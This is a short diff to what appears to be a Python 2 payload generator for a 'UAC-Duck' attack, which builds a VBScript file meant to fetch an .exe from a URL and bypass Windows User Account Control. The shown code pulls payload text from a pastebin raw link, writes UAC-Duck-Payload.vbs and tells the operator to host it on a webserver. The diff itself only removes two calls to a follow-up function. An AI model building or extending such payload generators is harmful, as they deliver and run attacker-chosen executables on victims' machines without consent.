@@ -66,7 +66,7 @@ def genuac():
 		print "Payload UAC-Duck-Payload.vbs generated!"
 		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
 		time.sleep(2)
-		genscripton()
+	
 	elif genpayon_name.endswith(".exe") and genpayon_url.endswith(".exe"):
 		with open('UAC-Duck-Payload.vbs', 'a') as the_file:
 			txt = urllib.urlopen("http://pastebin.com/raw/apyPSqWs").read()
@@ -76,7 +76,7 @@ def genuac():
 		print "Payload UAC-Duck-Payload.vbs generated!"
 		print "Please upload this .vbs file as raw text format to a webserver(Pastebin works great)"
 		time.sleep(2)
-		genscripton()
+		
 	else:
 		print "Please input a valid savename/URL ( Must end with .exe)"
 		genuac()
